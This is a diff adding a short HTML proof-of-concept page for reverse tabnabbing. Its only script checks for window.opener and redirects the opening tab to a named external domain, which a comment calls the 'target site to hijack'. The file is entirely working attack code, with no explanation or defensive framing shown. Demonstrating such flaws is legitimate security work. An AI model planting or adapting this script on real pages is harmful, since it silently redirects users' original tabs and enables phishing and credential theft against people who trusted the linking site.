@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Reverse Tabnabbing PoC</title>
+</head>
+<body>
+<h1>Welcome</h1>
+<script>
+  // Trigger redirect on opener after page load
+  if (window.opener) {
+    window.opener.location = "https://vantagepoint.co.th"; // target site to hijack
+  }
+</script>
+</body>
+</html>
